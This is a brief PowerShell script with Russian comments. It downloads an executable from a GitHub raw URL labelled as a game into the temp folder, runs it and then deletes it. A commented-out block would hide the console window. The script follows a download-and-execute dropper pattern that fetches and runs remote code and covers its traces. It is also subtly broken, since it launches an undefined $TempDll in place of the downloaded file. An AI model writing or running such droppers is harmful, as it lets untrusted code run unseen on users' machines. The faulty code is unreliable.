$ErrorActionPreference = "Stop"

# Прячем окно консоли на время (опционально, для эффекта)
# Add-Type -Name Window -Namespace Console -MemberDefinition '
# [DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
# [DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
# $consolePtr = [Console.Window]::GetConsoleWindow()
# [Console.Window]::ShowWindow($consolePtr, 0) # 0 = скрыть

$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/test.exe"
$TempExe = Join-Path ([IO.Path]::GetTempPath()) "test.exe"

Invoke-WebRequest -Uri $GameUrl -OutFile $TempExe -UseBasicParsing

$proc = Start-Process -FilePath $TempDll -PassThru
$proc.WaitForExit()

Remove-Item $TempExe -Force -ErrorAction SilentlyContinue
